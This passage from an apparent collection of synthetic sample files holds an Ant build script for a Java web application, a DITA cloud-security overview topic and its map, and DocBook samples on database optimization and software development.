    Sample Java Application Build Script
    This Ant build file demonstrates a comprehensive build process for a Java web application
    including compilation, testing, packaging, and deployment tasks.
  </description>

  <!-- Load build properties -->
  <property file="build.properties"/>
  <property file="${user.home}/build.properties"/>

  <!-- Project properties -->
  <property name="project.name" value="sample-java-app"/>
  <property name="project.version" value="1.2.3"/>
  <property name="project.vendor" value="Example Corporation"/>
  
  <!-- Directory structure -->
  <property name="src.dir" value="src/main/java"/>
  <property name="test.src.dir" value="src/test/java"/>
  <property name="resources.dir" value="src/main/resources"/>
  <property name="test.resources.dir" value="src/test/resources"/>
  <property name="web.dir" value="src/main/webapp"/>
  <property name="config.dir" value="config"/>
  
  <!-- Build directories -->
  <property name="build.dir" value="build"/>
  <property name="build.classes.dir" value="${build.dir}/classes"/>
  <property name="build.test.classes.dir" value="${build.dir}/test-classes"/>
  <property name="build.test.reports.dir" value="${build.dir}/test-reports"/>
  <property name="build.web.dir" value="${build.dir}/web"/>
  <property name="build.javadoc.dir" value="${build.dir}/javadoc"/>
  
  <!-- Distribution directories -->
  <property name="dist.dir" value="dist"/>
  <property name="lib.dir" value="lib"/>
  <property name="endorsed.lib.dir" value="lib/endorsed"/>
  
  <!-- Server properties -->
  <property name="server.home" value="/opt/tomcat"/>
  <property name="server.deploy.dir" value="${server.home}/webapps"/>
  
  <!-- Database properties -->
  <property name="db.host" value="localhost"/>
  <property name="db.port" value="5432"/>
  <property name="db.name" value="sample_app"/>
  <property name="db.user" value="app_user"/>
  <property name="db.password" value=""/>
  <property name="db.driver" value="org.postgresql.Driver"/>
  <property name="db.url" value="jdbc:postgresql://${db.host}:${db.port}/${db.name}"/>

  <!-- Compilation properties -->
  <property name="java.source.version" value="11"/>
  <property name="java.target.version" value="11"/>
  <property name="javac.debug" value="true"/>
  <property name="javac.deprecation" value="true"/>
  <property name="javac.optimize" value="false"/>

  <!-- Define classpaths -->
  <path id="compile.classpath">
    <fileset dir="${lib.dir}">
      <include name="**/*.jar"/>
    </fileset>
    <fileset dir="${endorsed.lib.dir}">
      <include name="**/*.jar"/>
    </fileset>
  </path>

  <path id="test.classpath">
    <path refid="compile.classpath"/>
    <pathelement location="${build.classes.dir}"/>
    <fileset dir="${lib.dir}/test">
      <include name="**/*.jar"/>
    </fileset>
  </path>

  <!-- Define custom tasks -->
  <taskdef resource="org/apache/ivy/ant/antlib.xml" uri="antlib:org.apache.ivy.ant" classpathref="compile.classpath"/>

  <!-- Ivy configuration for dependency management -->
  <ivy:settings file="ivysettings.xml"/>

  <!-- Target: help - Display available targets -->
  <target name="help" description="Display available build targets">
    <echo message="Available targets:"/>
    <echo message="  help        - Display this help message"/>
    <echo message="  init        - Initialize build directories"/>
    <echo message="  clean       - Clean build and distribution directories"/>
    <echo message="  resolve     - Resolve and retrieve dependencies"/>
    <echo message="  compile     - Compile Java source code"/>
    <echo message="  compile-tests - Compile test source code"/>
    <echo message="  test        - Run unit tests"/>
    <echo message="  package     - Create JAR and WAR files"/>
    <echo message="  javadoc     - Generate API documentation"/>
    <echo message="  build       - Complete build (compile + test + package)"/>
    <echo message="  deploy      - Deploy application to server"/>
    <echo message="  undeploy    - Remove application from server"/>
    <echo message="  dist        - Create distribution package"/>
    <echo message="  db-migrate  - Run database migrations"/>
    <echo message="  all         - Complete build and distribution"/>
  </target>

  <!-- Target: init - Initialize build environment -->
  <target name="init" description="Initialize build directories and check dependencies">
    <echo message="Initializing build for ${project.name} v${project.version}"/>
    <tstamp>
      <format property="build.timestamp" pattern="yyyy-MM-dd HH:mm:ss"/>
    </tstamp>
    
    <mkdir dir="${build.dir}"/>
    <mkdir dir="${build.classes.dir}"/>
    <mkdir dir="${build.test.classes.dir}"/>
    <mkdir dir="${build.test.reports.dir}"/>
    <mkdir dir="${build.web.dir}"/>
    <mkdir dir="${build.javadoc.dir}"/>
    <mkdir dir="${dist.dir}"/>
    
    <!-- Check for required directories -->
    <available file="${src.dir}" type="dir" property="src.dir.present"/>
    <fail unless="src.dir.present" message="Source directory ${src.dir} not found"/>
    
    <!-- Check Java version -->
    <condition property="java.version.ok">
      <and>
        <contains string="${java.version}" substring="11"/>
      </and>
    </condition>
    <fail unless="java.version.ok" message="Java 11 or higher required. Current version: ${java.version}"/>
    
    <echo message="Build initialized at ${build.timestamp}"/>
  </target>

  <!-- Target: clean - Clean build artifacts -->
  <target name="clean" description="Clean build and distribution directories">
    <echo message="Cleaning build directories..."/>
    <delete dir="${build.dir}" quiet="true"/>
    <delete dir="${dist.dir}" quiet="true"/>
    <delete>
      <fileset dir="." includes="**/*.log"/>
      <fileset dir="." includes="**/.DS_Store"/>
    </delete>
    <echo message="Clean completed"/>
  </target>

  <!-- Target: resolve - Resolve dependencies with Ivy -->
  <target name="resolve" depends="init" description="Resolve and retrieve dependencies">
    <echo message="Resolving dependencies..."/>
    <ivy:retrieve pattern="${lib.dir}/[conf]/[artifact]-[revision].[ext]" sync="true"/>
    <ivy:report todir="${build.dir}/ivy-reports"/>
    <echo message="Dependencies resolved"/>
  </target>

  <!-- Target: compile - Compile Java source -->
  <target name="compile" depends="init,resolve" description="Compile Java source code">
    <echo message="Compiling Java sources..."/>
    
    <javac srcdir="${src.dir}"
           destdir="${build.classes.dir}"
           source="${java.source.version}"
           target="${java.target.version}"
           debug="${javac.debug}"
           deprecation="${javac.deprecation}"
           optimize="${javac.optimize}"
           includeantruntime="false"
           encoding="UTF-8">
      <classpath refid="compile.classpath"/>
      <compilerarg value="-Xlint:unchecked"/>
      <compilerarg value="-Xlint:deprecation"/>
    </javac>
    
    <!-- Copy resources -->
    <copy todir="${build.classes.dir}">
      <fileset dir="${resources.dir}">
        <include name="**/*"/>
        <exclude name="**/*.java"/>
      </fileset>
    </copy>
    
    <!-- Filter and copy configuration files -->
    <copy todir="${build.classes.dir}" filtering="true">
      <fileset dir="${config.dir}">
        <include name="**/*.properties"/>
        <include name="**/*.xml"/>
      </fileset>
      <filterset>
        <filter token="PROJECT_VERSION" value="${project.version}"/>
        <filter token="BUILD_TIMESTAMP" value="${build.timestamp}"/>
        <filter token="DB_URL" value="${db.url}"/>
        <filter token="DB_USER" value="${db.user}"/>
      </filterset>
    </copy>
    
    <echo message="Compilation completed"/>
  </target>

  <!-- Target: compile-tests - Compile test sources -->
  <target name="compile-tests" depends="compile" description="Compile test source code">
    <echo message="Compiling test sources..."/>
    
    <javac srcdir="${test.src.dir}"
           destdir="${build.test.classes.dir}"
           source="${java.source.version}"
           target="${java.target.version}"
           debug="true"
           includeantruntime="false"
           encoding="UTF-8">
      <classpath refid="test.classpath"/>
    </javac>
    
    <!-- Copy test resources -->
    <copy todir="${build.test.classes.dir}">
      <fileset dir="${test.resources.dir}">
        <include name="**/*"/>
        <exclude name="**/*.java"/>
      </fileset>
    </copy>
    
    <echo message="Test compilation completed"/>
  </target>

  <!-- Target: test - Run unit tests -->
  <target name="test" depends="compile-tests" description="Run unit tests with JUnit">
    <echo message="Running unit tests..."/>
    
    <junit printsummary="true" 
           haltonfailure="false" 
           haltonerror="false"
           fork="true"
           forkmode="perBatch">
      
      <classpath>
        <path refid="test.classpath"/>
        <pathelement location="${build.test.classes.dir}"/>
      </classpath>
      
      <formatter type="xml"/>
      <formatter type="plain"/>
      
      <batchtest todir="${build.test.reports.dir}">
        <fileset dir="${test.src.dir}">
          <include name="**/*Test.java"/>
          <include name="**/*TestCase.java"/>
          <exclude name="**/Abstract*Test.java"/>
        </fileset>
      </batchtest>
    </junit>
    
    <!-- Generate HTML test reports -->
    <junitreport todir="${build.test.reports.dir}">
      <fileset dir="${build.test.reports.dir}">
        <include name="TEST-*.xml"/>
      </fileset>
      <report format="frames" todir="${build.test.reports.dir}/html"/>
    </junitreport>
    
    <echo message="Unit tests completed. Reports available in ${build.test.reports.dir}/html"/>
  </target>

  <!-- Target: package - Create application packages -->
  <target name="package" depends="compile" description="Create JAR and WAR files">
    <echo message="Creating application packages..."/>
    
    <!-- Create JAR file -->
    <jar destfile="${dist.dir}/${project.name}-${project.version}.jar"
         basedir="${build.classes.dir}">
      <manifest>
        <attribute name="Built-By" value="${user.name}"/>
        <attribute name="Built-Date" value="${build.timestamp}"/>
        <attribute name="Implementation-Title" value="${project.name}"/>
        <attribute name="Implementation-Version" value="${project.version}"/>
        <attribute name="Implementation-Vendor" value="${project.vendor}"/>
        <attribute name="Main-Class" value="com.example.app.Main"/>
        <attribute name="Class-Path" value="lib/"/>
      </manifest>
    </jar>
    
    <!-- Prepare web application -->
    <copy todir="${build.web.dir}">
      <fileset dir="${web.dir}"/>
    </copy>
    
    <copy todir="${build.web.dir}/WEB-INF/classes">
      <fileset dir="${build.classes.dir}"/>
    </copy>
    
    <copy todir="${build.web.dir}/WEB-INF/lib">
      <fileset dir="${lib.dir}/runtime">
        <include name="*.jar"/>
      </fileset>
    </copy>
    
    <!-- Create WAR file -->
    <war destfile="${dist.dir}/${project.name}-${project.version}.war"
         webxml="${build.web.dir}/WEB-INF/web.xml">
      <fileset dir="${build.web.dir}">
        <exclude name="WEB-INF/web.xml"/>
      </fileset>
      <manifest>
        <attribute name="Built-By" value="${user.name}"/>
        <attribute name="Built-Date" value="${build.timestamp}"/>
        <attribute name="Implementation-Title" value="${project.name}"/>
        <attribute name="Implementation-Version" value="${project.version}"/>
        <attribute name="Implementation-Vendor" value="${project.vendor}"/>
      </manifest>
    </war>
    
    <echo message="Packages created in ${dist.dir}"/>
  </target>

  <!-- Target: javadoc - Generate API documentation -->
  <target name="javadoc" depends="init" description="Generate Javadoc API documentation">
    <echo message="Generating Javadoc documentation..."/>
    
    <javadoc destdir="${build.javadoc.dir}"
             author="true"
             version="true"
             use="true"
             windowtitle="${project.name} API Documentation"
             doctitle="${project.name} v${project.version}"
             bottom="Copyright © 2025 ${project.vendor}. All rights reserved."
             access="protected"
             encoding="UTF-8"
             charset="UTF-8">
      
      <packageset dir="${src.dir}" defaultexcludes="yes">
        <include name="com/example/**"/>
        <exclude name="**/*Test*"/>
      </packageset>
      
      <classpath refid="compile.classpath"/>
      
      <link href="https://docs.oracle.com/en/java/javase/11/docs/api/"/>
      <link href="https://junit.org/junit4/javadoc/latest/"/>
      
      <group title="Core API" packages="com.example.core*"/>
      <group title="Web Layer" packages="com.example.web*"/>
      <group title="Data Access" packages="com.example.dao*"/>
      <group title="Utilities" packages="com.example.util*"/>
    </javadoc>
    
    <echo message="Javadoc generated in ${build.javadoc.dir}"/>
  </target>

  <!-- Target: build - Complete build process -->
  <target name="build" depends="compile,test,package" description="Complete build process">
    <echo message="Build completed successfully for ${project.name} v${project.version}"/>
  </target>

  <!-- Target: deploy - Deploy to application server -->
  <target name="deploy" depends="package" description="Deploy application to server">
    <echo message="Deploying ${project.name} to ${server.deploy.dir}..."/>
    
    <copy file="${dist.dir}/${project.name}-${project.version}.war"
          tofile="${server.deploy.dir}/${project.name}.war"
          overwrite="true"/>
    
    <echo message="Application deployed to ${server.deploy.dir}/${project.name}.war"/>
  </target>

  <!-- Target: undeploy - Remove application from server -->
  <target name="undeploy" description="Remove application from server">
    <echo message="Undeploying ${project.name} from ${server.deploy.dir}..."/>
    
    <delete file="${server.deploy.dir}/${project.name}.war" quiet="true"/>
    <delete dir="${server.deploy.dir}/${project.name}" quiet="true"/>
    
    <echo message="Application removed from server"/>
  </target>

  <!-- Target: db-migrate - Run database migrations -->
  <target name="db-migrate" depends="init" description="Run database migrations">
    <echo message="Running database migrations..."/>
    
    <sql driver="${db.driver}"
         url="${db.url}"
         userid="${db.user}"
         password="${db.password}"
         classpath="${lib.dir}/database/postgresql.jar"
         onerror="abort"
         print="true">
      <fileset dir="sql/migrations">
        <include name="*.sql"/>
      </fileset>
    </sql>
    
    <echo message="Database migrations completed"/>
  </target>

  <!-- Target: dist - Create distribution package -->
  <target name="dist" depends="build,javadoc" description="Create complete distribution package">
    <echo message="Creating distribution package..."/>
    
    <zip destfile="${dist.dir}/${project.name}-${project.version}-dist.zip">
      <zipfileset dir="${dist.dir}" includes="*.jar,*.war" prefix="${project.name}-${project.version}"/>
      <zipfileset dir="${build.javadoc.dir}" prefix="${project.name}-${project.version}/docs"/>
      <zipfileset dir="." includes="README.md,LICENSE,CHANGELOG.md" prefix="${project.name}-${project.version}"/>
      <zipfileset dir="config" prefix="${project.name}-${project.version}/config"/>
      <zipfileset dir="sql" prefix="${project.name}-${project.version}/sql"/>
    </zip>
    
    <!-- Create checksums -->
    <checksum file="${dist.dir}/${project.name}-${project.version}-dist.zip" algorithm="SHA-256"/>
    <checksum file="${dist.dir}/${project.name}-${project.version}.jar" algorithm="SHA-256"/>
    <checksum file="${dist.dir}/${project.name}-${project.version}.war" algorithm="SHA-256"/>
    
    <echo message="Distribution package created: ${dist.dir}/${project.name}-${project.version}-dist.zip"/>
  </target>

  <!-- Target: all - Complete build and distribution -->
  <target name="all" depends="clean,dist" description="Complete clean build and distribution">
    <echo message="Complete build process finished for ${project.name} v${project.version}"/>
  </target>

</project>
</file>

<file path="sample_data/test_files_synthetic/small/dita/cloud-security-overview.dita">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE concept PUBLIC "-//OASIS//DTD DITA Concept//EN" "concept.dtd">
<concept id="cloud_security_overview" xml:lang="en-US">
  <title>Cloud Security Overview</title>
  <shortdesc>This topic provides a comprehensive overview of cloud security principles, 
    best practices, and implementation strategies for enterprise environments.</shortdesc>
  
  <prolog>
    <metadata>
      <prodinfo>
        <prodname>Enterprise Cloud Security Guide</prodname>
        <vrmlist>
          <vrm version="2.1" release="3" modification="0"/>
        </vrmlist>
      </prodinfo>
      <othermeta name="author" content="Security Team"/>
      <othermeta name="reviewed-by" content="Chief Security Officer"/>
      <othermeta name="last-modified" content="2025-07-23"/>
      <othermeta name="classification" content="internal"/>
      <othermeta name="audience" content="IT professionals, security administrators"/>
    </metadata>
    <resourceid id="sec-001" appname="SecurityDocs"/>
  </prolog>
  
  <conbody>
    <p>Cloud security encompasses a broad set of policies, technologies, applications, 
       and controls utilized to protect virtualized IP, data, applications, services, 
       and the associated infrastructure of cloud computing.</p>
    
    <section id="security_fundamentals">
      <title>Security Fundamentals</title>
      <p>The foundation of cloud security rests on several key principles that organizations 
         must understand and implement:</p>
      
      <ul>
        <li><b>Shared Responsibility Model</b>: Understanding the division of security 
            responsibilities between cloud provider and customer</li>
        <li><b>Identity and Access Management (IAM)</b>: Controlling who can access 
            what resources under which circumstances</li>
        <li><b>Data Protection</b>: Ensuring data confidentiality, integrity, and 
            availability throughout its lifecycle</li>
        <li><b>Network Security</b>: Implementing proper network segmentation and 
            traffic filtering</li>
        <li><b>Compliance</b>: Meeting regulatory and industry standards requirements</li>
      </ul>
    </section>
    
    <section id="threat_landscape">
      <title>Cloud Threat Landscape</title>
      <p>Organizations must be aware of the evolving threat landscape specific to 
         cloud environments:</p>
      
      <dl>
        <dlentry>
          <dt>Data Breaches</dt>
          <dd>Unauthorized access to sensitive information stored in cloud systems, 
              often resulting from misconfigurations or compromised credentials.</dd>
        </dlentry>
        <dlentry>
          <dt>Account Hijacking</dt>
          <dd>Attackers gaining control of cloud service accounts through phishing, 
              credential stuffing, or social engineering attacks.</dd>
        </dlentry>
        <dlentry>
          <dt>Insider Threats</dt>
          <dd>Malicious or negligent actions by employees, contractors, or business 
              partners with legitimate access to cloud resources.</dd>
        </dlentry>
        <dlentry>
          <dt>API Vulnerabilities</dt>
          <dd>Security weaknesses in cloud service APIs that can be exploited to 
              gain unauthorized access or manipulate cloud resources.</dd>
        </dlentry>
        <dlentry>
          <dt>Denial of Service (DoS)</dt>
          <dd>Attacks designed to overwhelm cloud services and make them unavailable 
              to legitimate users.</dd>
        </dlentry>
      </dl>
    </section>
    
    <section id="security_controls">
      <title>Essential Security Controls</title>
      <p>Implementing comprehensive security controls is crucial for maintaining 
         a secure cloud environment:</p>
      
      <table id="security_controls_table" frame="all" rowsep="1" colsep="1">
        <title>Cloud Security Controls Matrix</title>
        <tgroup cols="4">
          <colspec colname="control" colwidth="25*"/>
          <colspec colname="description" colwidth="35*"/>
          <colspec colname="priority" colwidth="15*"/>
          <colspec colname="implementation" colwidth="25*"/>
          <thead>
            <row>
              <entry>Control</entry>
              <entry>Description</entry>
              <entry>Priority</entry>
              <entry>Implementation Method</entry>
            </row>
          </thead>
          <tbody>
            <row>
              <entry>Multi-Factor Authentication</entry>
              <entry>Require additional verification beyond username/password</entry>
              <entry>High</entry>
              <entry>IAM service configuration</entry>
            </row>
            <row>
              <entry>Encryption at Rest</entry>
              <entry>Encrypt stored data using strong encryption algorithms</entry>
              <entry>High</entry>
              <entry>Service-native encryption</entry>
            </row>
            <row>
              <entry>Encryption in Transit</entry>
              <entry>Protect data during transmission between systems</entry>
              <entry>High</entry>
              <entry>TLS/SSL protocols</entry>
            </row>
            <row>
              <entry>Network Segmentation</entry>
              <entry>Isolate resources using virtual networks and subnets</entry>
              <entry>Medium</entry>
              <entry>Virtual private clouds</entry>
            </row>
            <row>
              <entry>Security Monitoring</entry>
              <entry>Continuous monitoring of security events and anomalies</entry>
              <entry>High</entry>
              <entry>SIEM integration</entry>
            </row>
            <row>
              <entry>Backup and Recovery</entry>
              <entry>Regular data backups with tested recovery procedures</entry>
              <entry>Medium</entry>
              <entry>Automated backup services</entry>
            </row>
          </tbody>
        </tgroup>
      </table>
    </section>
    
    <section id="compliance_frameworks">
      <title>Compliance Frameworks</title>
      <p>Organizations must consider various compliance requirements when implementing 
         cloud security:</p>
      
      <note type="important">
        <p>Compliance requirements vary by industry, geography, and organization type. 
           Consult with legal and compliance teams before making implementation decisions.</p>
      </note>
      
      <simpletable id="compliance_table" keycol="1">
        <sthead>
          <stentry>Framework</stentry>
          <stentry>Industry Focus</stentry>
          <stentry>Key Requirements</stentry>
        </sthead>
        <strow>
          <stentry>SOC 2</stentry>
          <stentry>Service Organizations</stentry>
          <stentry>Security, availability, processing integrity, confidentiality, privacy</stentry>
        </strow>
        <strow>
          <stentry>ISO 27001</stentry>
          <stentry>All Industries</stentry>
          <stentry>Information security management systems (ISMS)</stentry>
        </strow>
        <strow>
          <stentry>GDPR</stentry>
          <stentry>EU Data Processing</stentry>
          <stentry>Data protection and privacy for EU residents</stentry>
        </strow>
        <strow>
          <stentry>HIPAA</stentry>
          <stentry>Healthcare</stentry>
          <stentry>Protected health information (PHI) security and privacy</stentry>
        </strow>
        <strow>
          <stentry>PCI DSS</stentry>
          <stentry>Payment Processing</stentry>
          <stentry>Credit card data protection and secure payment processing</stentry>
        </strow>
      </simpletable>
    </section>
    
    <section id="implementation_best_practices">
      <title>Implementation Best Practices</title>
      <p>Follow these best practices when implementing cloud security measures:</p>
      
      <ol>
        <li><b>Start with Security by Design</b>
          <p>Incorporate security considerations from the initial planning phase 
             rather than retrofitting security controls later.</p>
        </li>
        <li><b>Implement Zero Trust Architecture</b>
          <p>Verify every user and device before granting access to cloud resources, 
             regardless of their location or previous authentication status.</p>
        </li>
        <li><b>Use Infrastructure as Code (IaC)</b>
          <p>Define infrastructure using code to ensure consistent, repeatable, 
             and auditable deployments with built-in security controls.</p>
        </li>
        <li><b>Establish Continuous Monitoring</b>
          <p>Implement real-time monitoring and alerting systems to detect and 
             respond to security incidents promptly.</p>
        </li>
        <li><b>Regular Security Assessments</b>
          <p>Conduct periodic security assessments, penetration testing, and 
             vulnerability scans to identify and address security gaps.</p>
        </li>
        <li><b>Employee Training and Awareness</b>
          <p>Provide regular security training to all employees who interact 
             with cloud systems and maintain security awareness programs.</p>
        </li>
      </ol>
    </section>
    
    <section id="incident_response">
      <title>Incident Response Planning</title>
      <p>A well-defined incident response plan is essential for cloud environments:</p>
      
      <fig id="incident_response_workflow">
        <title>Cloud Security Incident Response Workflow</title>
        <desc>This figure illustrates the standard workflow for responding to 
              security incidents in cloud environments.</desc>
        <!-- In a real implementation, this would reference an actual image file -->
        <image href="images/incident_response_workflow.svg" width="600px" height="400px">
          <alt>Flowchart showing incident response steps: Detection, Analysis, 
               Containment, Eradication, Recovery, and Lessons Learned</alt>
        </image>
      </fig>
      
      <p>Key components of an effective incident response plan include:</p>
      <ul>
        <li>Clear roles and responsibilities</li>
        <li>Communication procedures</li>
        <li>Evidence collection and preservation</li>
        <li>Containment and mitigation strategies</li>
        <li>Recovery and restoration procedures</li>
        <li>Post-incident analysis and improvement</li>
      </ul>
    </section>
  </conbody>
  
  <related-links>
    <link href="cloud_security_implementation.dita" type="task">
      <linktext>Cloud Security Implementation Guide</linktext>
      <desc>Step-by-step procedures for implementing cloud security controls</desc>
    </link>
    <link href="security_monitoring_setup.dita" type="task">
      <linktext>Security Monitoring Setup</linktext>
      <desc>How to configure security monitoring and alerting systems</desc>
    </link>
    <link href="compliance_checklist.dita" type="reference">
      <linktext>Compliance Checklist</linktext>
      <desc>Comprehensive checklist for compliance requirements</desc>
    </link>
    <link href="https://www.nist.gov/cyberframework" format="html" scope="external">
      <linktext>NIST Cybersecurity Framework</linktext>
      <desc>Official NIST cybersecurity framework documentation</desc>
    </link>
  </related-links>
</concept>
</file>

<file path="sample_data/test_files_synthetic/small/dita/enterprise-security-guide.ditamap">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE map PUBLIC "-//OASIS//DTD DITA Map//EN" "map.dtd">
<map id="enterprise_security_guide" xml:lang="en-US">
  <title>Enterprise Cloud Security Guide</title>
  
  <topicmeta>
    <author>Enterprise Security Team</author>
    <publisher>IT Department</publisher>
    <copyright>
      <copyryear year="2025"/>
      <copyrholder>Example Corporation</copyrholder>
    </copyright>
    <critdates>
      <created date="2025-07-23"/>
      <revised modified="2025-07-23"/>
    </critdates>
    <metadata>
      <prodinfo>
        <prodname>Enterprise Security Documentation</prodname>
        <vrmlist>
          <vrm version="2.1" release="3" modification="0"/>
        </vrmlist>
      </prodinfo>
      <othermeta name="security-level" content="internal"/>
      <othermeta name="document-type" content="technical-guide"/>
    </metadata>
  </topicmeta>
  
  <!-- Front matter -->
  <topicref href="preface.dita" type="concept">
    <topicmeta>
      <navtitle>Preface</navtitle>
    </topicmeta>
  </topicref>
  
  <!-- Main content organized by topics -->
  <topichead navtitle="Cloud Security Fundamentals">
    <topicref href="cloud-security-overview.dita" type="concept">
      <topicmeta>
        <navtitle>Cloud Security Overview</navtitle>
        <shortdesc>Comprehensive overview of cloud security principles and best practices</shortdesc>
      </topicmeta>
    </topicref>
    
    <topicref href="shared-responsibility-model.dita" type="concept">
      <topicmeta>
        <navtitle>Shared Responsibility Model</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="threat-landscape.dita" type="concept">
      <topicmeta>
        <navtitle>Cloud Threat Landscape</navtitle>
      </topicmeta>
    </topicref>
  </topichead>
  
  <topichead navtitle="Identity and Access Management">
    <topicref href="iam-overview.dita" type="concept">
      <topicmeta>
        <navtitle>IAM Overview</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="configure-mfa.dita" type="task">
      <topicmeta>
        <navtitle>Configure Multi-Factor Authentication</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="role-based-access.dita" type="task">
      <topicmeta>
        <navtitle>Implement Role-Based Access Control</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="iam-policies.dita" type="reference">
      <topicmeta>
        <navtitle>IAM Policy Reference</navtitle>
      </topicmeta>
    </topicref>
  </topichead>
  
  <topichead navtitle="Data Protection">
    <topicref href="data-classification.dita" type="concept">
      <topicmeta>
        <navtitle>Data Classification</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="encryption-at-rest.dita" type="task">
      <topicmeta>
        <navtitle>Configure Encryption at Rest</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="encryption-in-transit.dita" type="task">
      <topicmeta>
        <navtitle>Configure Encryption in Transit</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="key-management.dita" type="task">
      <topicmeta>
        <navtitle>Key Management Best Practices</navtitle>
      </topicmeta>
    </topicref>
  </topichead>
  
  <topichead navtitle="Network Security">
    <topicref href="network-architecture.dita" type="concept">
      <topicmeta>
        <navtitle>Secure Network Architecture</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="configure-vpc.dita" type="task">
      <topicmeta>
        <navtitle>Configure Virtual Private Cloud</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="setup-firewall-rules.dita" type="task">
      <topicmeta>
        <navtitle>Setup Firewall Rules</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="network-monitoring.dita" type="task">
      <topicmeta>
        <navtitle>Implement Network Monitoring</navtitle>
      </topicmeta>
    </topicref>
  </topichead>
  
  <topichead navtitle="Security Monitoring and Incident Response">
    <topicref href="security-monitoring-overview.dita" type="concept">
      <topicmeta>
        <navtitle>Security Monitoring Overview</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="setup-siem.dita" type="task">
      <topicmeta>
        <navtitle>Setup SIEM Integration</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="configure-alerting.dita" type="task">
      <topicmeta>
        <navtitle>Configure Security Alerting</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="incident-response-procedures.dita" type="task">
      <topicmeta>
        <navtitle>Incident Response Procedures</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="forensics-guidelines.dita" type="reference">
      <topicmeta>
        <navtitle>Digital Forensics Guidelines</navtitle>
      </topicmeta>
    </topicref>
  </topichead>
  
  <topichead navtitle="Compliance and Governance">
    <topicref href="compliance-overview.dita" type="concept">
      <topicmeta>
        <navtitle>Compliance Overview</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="gdpr-compliance.dita" type="task">
      <topicmeta>
        <navtitle>GDPR Compliance Implementation</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="soc2-audit-prep.dita" type="task">
      <topicmeta>
        <navtitle>SOC 2 Audit Preparation</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="policy-templates.dita" type="reference">
      <topicmeta>
        <navtitle>Security Policy Templates</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="compliance-checklist.dita" type="reference">
      <topicmeta>
        <navtitle>Compliance Checklist</navtitle>
      </topicmeta>
    </topicref>
  </topichead>
  
  <!-- Appendices -->
  <topichead navtitle="Appendices">
    <topicref href="security-tools-comparison.dita" type="reference">
      <topicmeta>
        <navtitle>Security Tools Comparison</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="glossary.dita" type="reference">
      <topicmeta>
        <navtitle>Glossary</navtitle>
      </topicmeta>
    </topicref>
    
    <topicref href="resources-links.dita" type="reference">
      <topicmeta>
        <navtitle>Additional Resources</navtitle>
      </topicmeta>
    </topicref>
  </topichead>
  
  <!-- Relationship table for cross-references -->
  <reltable>
    <title>Related Information</title>
    <relheader>
      <relcolspec type="concept"/>
      <relcolspec type="task"/>
      <relcolspec type="reference"/>
    </relheader>
    <relrow>
      <relcell>
        <topicref href="cloud-security-overview.dita"/>
      </relcell>
      <relcell>
        <topicref href="configure-mfa.dita"/>
        <topicref href="encryption-at-rest.dita"/>
      </relcell>
      <relcell>
        <topicref href="iam-policies.dita"/>
        <topicref href="compliance-checklist.dita"/>
      </relcell>
    </relrow>
    <relrow>
      <relcell>
        <topicref href="iam-overview.dita"/>
      </relcell>
      <relcell>
        <topicref href="configure-mfa.dita"/>
        <topicref href="role-based-access.dita"/>
      </relcell>
      <relcell>
        <topicref href="iam-policies.dita"/>
      </relcell>
    </relrow>
    <relrow>
      <relcell>
        <topicref href="data-classification.dita"/>
      </relcell>
      <relcell>
        <topicref href="encryption-at-rest.dita"/>
        <topicref href="encryption-in-transit.dita"/>
      </relcell>
      <relcell>
        <topicref href="policy-templates.dita"/>
      </relcell>
    </relrow>
  </reltable>
</map>
</file>

<file path="sample_data/test_files_synthetic/small/docbook/article.xml">
<?xml version="1.0" encoding="UTF-8"?>
<article xmlns="http://docbook.org/ns/docbook" version="5.0">
  <info>
    <title>Database Optimization Techniques</title>
    <author>
      <personname>
        <firstname>Sarah</firstname>
        <surname>DataEngineer</surname>
      </personname>
    </author>
    <date>2024-01-10</date>
    <abstract>
      <para>This article explores various database optimization techniques 
      to improve query performance and system efficiency.</para>
    </abstract>
  </info>
  
  <section xml:id="indexing">
    <title>Database Indexing</title>
    <para>Proper indexing is crucial for database performance.</para>
    
    <example>
      <title>Creating an Index</title>
      <programlisting language="sql">
CREATE INDEX idx_user_email ON users(email);
CREATE INDEX idx_order_date ON orders(order_date DESC);
      </programlisting>
    </example>
    
    <tip>
      <para>Monitor index usage regularly and remove unused indexes 
      to avoid unnecessary storage overhead.</para>
    </tip>
  </section>
  
  <section xml:id="query-optimization">
    <title>Query Optimization</title>
    <para>Well-written queries can significantly improve performance.</para>
    
    <itemizedlist>
      <listitem><para>Use appropriate WHERE clauses</para></listitem>
      <listitem><para>Avoid SELECT * in production queries</para></listitem>
      <listitem><para>Consider query execution plans</para></listitem>
    </itemizedlist>
    
    <important>
      <para>Always test performance changes in a staging environment 
      that mirrors production data volumes.</para>
    </important>
  </section>
</article>
</file>

<file path="sample_data/test_files_synthetic/small/docbook/book.xml">
<?xml version="1.0" encoding="UTF-8"?>
<book xmlns="http://docbook.org/ns/docbook" version="5.0" xml:lang="en">
  <info>
    <title>Software Development Guide</title>
    <subtitle>Best Practices and Methodologies</subtitle>
    <author>
      <personname>
        <firstname>John</firstname>
        <surname>Developer</surname>
      </personname>
      <email>john.developer@example.com</email>
      <affiliation>
        <orgname>Tech Solutions Inc.</orgname>
      </affiliation>
    </author>
    <date>2024-01-15</date>
    <copyright>
      <year>2024</year>
      <holder>Tech Solutions Inc.</holder>
    </copyright>
    <abstract>
      <para>This comprehensive guide covers modern software development practices, 
      including agile methodologies, version control, testing strategies, and 
      deployment best practices.</para>
    </abstract>
    <keywordset>
      <keyword>software development</keyword>
